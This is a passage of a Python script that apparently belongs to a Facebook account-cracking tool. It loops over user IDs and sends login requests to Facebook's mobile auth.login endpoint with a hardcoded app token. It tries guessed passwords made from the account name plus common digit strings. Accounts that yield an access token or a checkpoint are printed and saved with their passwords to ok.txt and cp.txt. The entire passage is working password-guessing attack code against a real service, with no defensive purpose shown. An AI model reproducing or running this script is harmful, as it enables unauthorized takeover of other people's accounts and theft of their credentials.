print("\033[1;94m[\033[1;97mCP \033[1;94m]\033[1;97m "+uid+"\033[1;91m- -\033[1;97m"+pass5+"\033[1;91m- -\033[1;97m"+name)
                                                        cp=open("cp.txt","a")
                                                        cp.write(uid+" | "+pass5+"\n")
                                                        cp.close()
                                                        cps.append(uid)
                                                    else:
                                                        if 'access_token' in d:
                                                            print("\033[1;94m[\033[1;92mOK \033[1;94m]\033[1;97m "+uid+"\033[1;91m- -\033[1;97m"+pass5+"\033[1;91m- -\033[1;97m"+name)
                                                            ok=open("ok.txt","a")
                                                            ok.write(uid+" | "+pass5+"\n")
                                                            ok.close()
                                                            oks.append(uid)
                                                        else:
                                                            pass6=name+"123456"
                                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
                                                            d=json.loads(q)
                                                            if 'www.facebook.com' in d['error_msg']:
                                                                 print("\033[1;94m[\033[1;97mCP \033[1;94m]\033[1;97m "+uid+"\033[1;91m- -\033[1;97m"+pass6+"\033[1;91m- -\033[1;97m"+name)
                                                                 cp=open("cp.txt","a")
                                                                 cp.write(uid+" | "+pass6+"\n")
                                                                 cp.close()
                                                                 cps.append(uid)
                                                            else:
                                                                if 'access_token' in d:
                                                                    print("\033[1;94m[\033[1;92mOK \033[1;94m]\033[1;97m "+uid+"\033[1;91m- -\033[1;97m"+pass6+"\033[1;91m- -\033[1;97m"+name)
                                                                    ok=open("ok.txt","a")
                                                                    ok.write(uid+" | "+pass6+"\n")
                                                                    ok.close()
                                                                    oks.append(uid)
                                                                else:
                                                                    pass7=name+"100200"
                                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
                                                                    d=json.loads(q)
                                                                    if 'www.facebook.com' in d['error_msg']:
                                                                        print("\033[1;94m[\033[1;97mCP \033[1;94m]\033[1;97m "+uid+"\033[1;91m- -\033[1;97m"+pass7+"\033[1;91m- -\033[1;97m"+name)
